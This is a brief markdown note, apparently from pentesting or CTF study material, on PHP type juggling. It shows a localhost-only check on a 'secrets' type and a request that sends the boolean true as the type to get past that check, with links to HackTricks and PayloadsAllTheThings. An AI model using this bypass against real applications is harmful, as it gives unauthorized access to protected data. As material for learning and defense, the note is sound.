# Detection
### Bypass comparison
- Source code
  ```php
  if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
        {
            return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
        }
  ```
- Wrong request
  ```bash
  POST /api/getfacts HTTP/1.1
  (Request Body)
  {
    "type":  "secrets"
  }
  ```
- Good request
  ```bash
  POST /api/getfacts HTTP/1.1
  (Request Body)
  {
    "type":  true
  }
  ```  

# Resource 
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
